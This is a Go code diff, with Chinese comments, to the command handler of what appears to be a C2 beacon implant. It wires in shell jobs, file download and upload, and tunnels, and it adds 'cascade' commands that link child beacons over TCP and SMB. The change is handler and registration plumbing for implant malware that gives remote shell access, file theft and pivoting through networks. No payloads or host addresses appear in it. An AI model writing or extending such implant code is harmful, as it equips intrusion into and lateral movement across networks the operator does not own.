@@ -43,6 +43,15 @@ const (
 	CommandTunnelControl uint32 = 61
 	CommandTunnelData    uint32 = 62
 	CommandTunnelClose   uint32 = 63
+
+	CommandCascadeConnectTCP uint32 = 80
+	CommandCascadeLinkSMB    uint32 = 81
+	CommandCascadeRoute      uint32 = 82
+	CommandCascadeClose      uint32 = 83
+	CommandCascadeOpen       uint32 = 84
+	CommandCascadeRead       uint32 = 85
+	CommandCascadeDead       uint32 = 86
+	CommandCascadePing       uint32 = 87
 )
 
 // Command 定义了所有可执行命令的接口。
@@ -57,15 +66,21 @@ type Handler struct {
 	BeaconID   uint32
 	SessionKey []byte
 	Jobs       *jobs.Manager
+	Transfers  *TransferManager
+	Tunnels    *TunnelRuntime
+	Cascade    *CascadeManager
 	resultSink func([]byte)
 }
 
 // NewHandler 创建命令处理器，注册所有内置命令并启动后台清理。
 func NewHandler(acp int) *Handler {
 	h := &Handler{
-		commands: make(map[uint32]Command),
-		ACP:      acp,
-		Jobs:     jobs.NewManager(),
+		commands:  make(map[uint32]Command),
+		ACP:       acp,
+		Jobs:      jobs.NewManager(),
+		Transfers: NewTransferManager(),
+		Tunnels:   NewTunnelRuntime(),
+		Cascade:   NewCascadeManager(),
 	}
 	// 通用控制
 	h.Register(CommandSleep, &SleepCommand{})
@@ -112,8 +127,13 @@ func NewHandler(acp int) *Handler {
 	h.Register(CommandTunnelData, &TunnelDataCommand{})
 	h.Register(CommandTunnelClose, &TunnelControlCommand{Action: "close"})
 
+	h.Register(CommandCascadeConnectTCP, &CascadeConnectTCPCommand{})
+	h.Register(CommandCascadeLinkSMB, &CascadeLinkSMBCommand{})
+	h.Register(CommandCascadeRoute, &CascadeRouteCommand{})
+	h.Register(CommandCascadeClose, &CascadeCloseCommand{})
+
 	// 启动后台清理
-	StartTunnelJanitor()
+	h.Tunnels.StartJanitor()
 
 	return h
 }
@@ -139,6 +159,20 @@ func (h *Handler) Close() {
 	if h != nil && h.Jobs != nil {
 		h.Jobs.Close()
 	}
+	if h != nil && h.Tunnels != nil {
+		h.Tunnels.Close()
+	}
+	if h != nil && h.Cascade != nil {
+		h.Cascade.Close()
+	}
+}
+
+// ShutdownCascade 在父 beacon 退出前调用：同步关闭所有级联子链路并将
+// CascadeDead 写入 pending，确保当前心跳轮次能将 Dead 通知刷给服务端。
+func (h *Handler) ShutdownCascade() {
+	if h != nil && h.Cascade != nil {
+		h.Cascade.ShutdownAll()
+	}
 }
 
 // Register 注册一个命令 ID 到 Command 实现的映射。
@@ -157,14 +191,23 @@ func (h *Handler) Handle(taskId uint32, commandId uint32, data []byte) ([][]byte
 
 	// 下载指令特殊处理：需要 taskId 组包
 	if commandId == CommandDownload {
-		return Download(parser, taskId, h.ACP)
+		return h.Transfers.Download(parser, taskId, h.ACP)
 	}
 	if commandId == CommandUpload {
-		res, err := Upload(parser, taskId, h.ACP)
+		res, err := h.Transfers.Upload(parser, taskId, h.ACP)
 		return [][]byte{res}, err
 	}
 	if commandId == CommandTunnelStart {
-		return StartTunnelTask(taskId, parser, h.ACP)
+		return StartTunnelTask(h.Tunnels, taskId, parser, h.ACP)
+	}
+	if commandId == CommandTunnelControl {
+		return HandleTunnelControlTask(h.Tunnels, parser)
+	}
+	if commandId == CommandTunnelData {
+		return HandleTunnelDataTask(h.Tunnels, parser)
+	}
+	if commandId == CommandTunnelClose {
+		return HandleTunnelCloseTask(h.Tunnels, parser)
 	}
 	if commandId == CommandShell {
 		res, err := StartShellJob(h.Jobs, h.resultSink, taskId, commandId, parser, h.ACP, false)
@@ -179,11 +222,27 @@ func (h *Handler) Handle(taskId uint32, commandId uint32, data []byte) ([][]byte
 		return [][]byte{res}, err
 	}
 	if commandId == CommandJobs {
-		res, err := Jobs(h.Jobs)
+		res, err := Jobs(h.Jobs, h.Transfers, h.Tunnels)
 		return [][]byte{res}, err
 	}
 	if commandId == CommandKillJob {
-		res, err := KillJob(h.Jobs, parser)
+		res, err := KillJob(h.Jobs, h.Transfers, h.Tunnels, parser)
+		return [][]byte{res}, err
+	}
+	if commandId == CommandCascadeConnectTCP {
+		res, err := h.Cascade.ConnectTCP(parser)
+		return [][]byte{res}, err
+	}
+	if commandId == CommandCascadeLinkSMB {
+		res, err := h.Cascade.LinkSMB(parser)
+		return [][]byte{res}, err
+	}
+	if commandId == CommandCascadeRoute {
+		res, err := h.Cascade.Route(parser)
+		return [][]byte{res}, err
+	}
+	if commandId == CommandCascadeClose {
+		res, err := h.Cascade.CloseChannel(parser)
 		return [][]byte{res}, err
 	}
 
@@ -193,12 +252,16 @@ func (h *Handler) Handle(taskId uint32, commandId uint32, data []byte) ([][]byte
 
 // GetPendingDownloadPackets 获取文件下载的挂起数据包（每次心跳调用）。
 func (h *Handler) GetPendingDownloadPackets() [][]byte {
-	return GetPendingDownloadPackets()
+	return h.Transfers.GetPendingDownloadPackets()
 }
 
 // GetPendingTunnelPackets 获取隧道转发的挂起数据包（每次心跳调用）。
 func (h *Handler) GetPendingTunnelPackets() [][]byte {
-	return tunnelRuntime.GetPendingPackets()
+	return h.Tunnels.GetPendingPackets()
+}
+
+func (h *Handler) GetPendingCascadePackets() [][]byte {
+	return h.Cascade.GetPendingPackets()
 }
 
 // ---------------------------------------------------------------------------
@@ -408,4 +471,28 @@ type UploadCommand struct{}
 
 func (u *UploadCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
 	return nil, fmt.Errorf("Upload command should be handled specially in Handler")
+}
+
+type CascadeConnectTCPCommand struct{}
+
+func (c *CascadeConnectTCPCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
+	return nil, fmt.Errorf("CascadeConnectTCP should be handled specially in Handler")
+}
+
+type CascadeLinkSMBCommand struct{}
+
+func (c *CascadeLinkSMBCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
+	return nil, fmt.Errorf("CascadeLinkSMB should be handled specially in Handler")
+}
+
+type CascadeRouteCommand struct{}
+
+func (c *CascadeRouteCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
+	return nil, fmt.Errorf("CascadeRoute should be handled specially in Handler")
+}
+
+type CascadeCloseCommand struct{}
+
+func (c *CascadeCloseCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
+	return nil, fmt.Errorf("CascadeClose should be handled specially in Handler")
 }
